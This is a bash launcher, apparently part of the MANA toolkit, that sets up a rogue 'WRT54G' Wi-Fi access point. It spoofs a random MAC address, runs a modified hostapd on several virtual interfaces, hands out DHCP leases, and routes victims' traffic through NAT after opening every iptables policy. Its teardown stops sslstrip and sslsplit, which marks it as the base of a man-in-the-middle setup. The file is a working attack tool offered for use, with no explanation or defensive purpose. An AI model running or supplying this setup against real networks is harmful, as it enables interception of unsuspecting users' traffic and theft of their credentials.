#!/bin/bash

upstream=eth0
phy=wlan1
conf=/etc/mana-toolkit/hostapd-common.conf
hostapd=/usr/lib/mana-toolkit/hostapd

hostname WRT54G
echo hostname WRT54G
sleep 2

service network-manager stop
rfkill unblock wlan

ifconfig $phy down
macchanger -r $phy
ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig wlan 10.0.0.1 netmask 255.255.255.0
ifconfig wlan1_1 10.0.10.1 netmask 255.255.255.0
ifconfig wlan1_2 10.0.20.1 netmask 255.255.255.0
ifconfig wlan1_3 10.0.30.1 netmask 255.255.255.0
ifconfig wlan1_4 10.0.40.1 netmask 255.255.255.0
ifconfig wlan1_5 10.0.50.1 netmask 255.255.255.0
ifconfig wlan1_6 10.0.60.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
route add -net 10.0.10.0 netmask 255.255.255.0 gw 10.0.10.1
route add -net 10.0.20.0 netmask 255.255.255.0 gw 10.0.20.1
route add -net 10.0.30.0 netmask 255.255.255.0 gw 10.0.30.1
route add -net 10.0.40.0 netmask 255.255.255.0 gw 10.0.40.1
route add -net 10.0.50.0 netmask 255.255.255.0 gw 10.0.50.1
route add -net 10.0.60.0 netmask 255.255.255.0 gw 10.0.60.1

dhcpd -cf /etc/mana-toolkit/dhcpd-common.conf wlan1 wlan1_1 wlan1_2 wlan1_3 wlan1_4 wlan1_5 wlan1_6 

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -j ACCEPT

echo "Hit enter to kill me"
read
pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables -t nat -F
